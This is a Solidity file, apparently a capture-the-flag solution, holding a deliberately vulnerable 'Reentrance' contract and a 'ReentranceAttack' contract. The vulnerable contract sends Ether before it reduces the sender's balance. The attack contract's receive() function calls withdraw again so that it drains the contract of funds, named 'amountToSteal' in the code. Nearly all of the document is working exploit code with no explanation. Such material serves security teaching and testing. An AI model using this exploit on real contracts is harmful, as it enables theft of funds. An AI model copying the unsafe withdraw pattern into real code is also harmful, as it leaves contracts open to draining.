// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

// Attack contract...

interface IReentrance {
    function donate(address) external payable;

    function withdraw(uint) external;
}

contract ReentranceAttack {
    address public immutable instance;
    uint256 amountToSteal;

    constructor(address _instance, uint256 _amount) public {
        amountToSteal = _amount;
        instance = _instance;
    }

    function donateFunds() public payable {
        IReentrance(instance).donate{value: msg.value}(address(this));
    }

    function withdrawFunds() public payable {
        IReentrance(instance).withdraw(amountToSteal);
    }

    receive() external payable {
        IReentrance(instance).withdraw(amountToSteal);
    }
}
